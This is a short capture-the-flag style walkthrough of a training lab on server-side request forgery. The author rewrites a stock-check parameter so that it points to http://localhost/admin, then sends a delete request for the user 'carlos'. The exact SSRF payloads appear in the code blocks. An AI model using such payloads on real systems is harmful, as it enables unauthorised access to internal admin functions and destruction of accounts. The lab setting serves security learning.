## Basic SSRF against the local server

> Task: To change the stock api to `http://localhost/admin` and delete the user `carlos`.

There are plenty of posts with stock check functionality over city names.


<img width="320" height="118" alt="image1" src="https://github.com/user-attachments/assets/4a0f8cc3-b92d-4218-9299-5745c32b7757" />


Once i checked stock, it generates a apikey.

```bash
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D6%26storeId%3D1
```

The stockapi is changed to http://localhost/admin which responded with,

<img width="1326" height="147" alt="image2" src="https://github.com/user-attachments/assets/2604da5b-e999-492f-aff5-c4f178188bfe" />


Now i checked the stockApi with manipulated endpoint.

```bash
stockApi=http://localhost/admin/delete?username=carlos
```

It deleted the user 'carlos' and the lab is solved

<img width="800" height="568" alt="image" src="https://github.com/user-attachments/assets/6477094b-01e8-4882-b211-6c2f5cc067c4" />
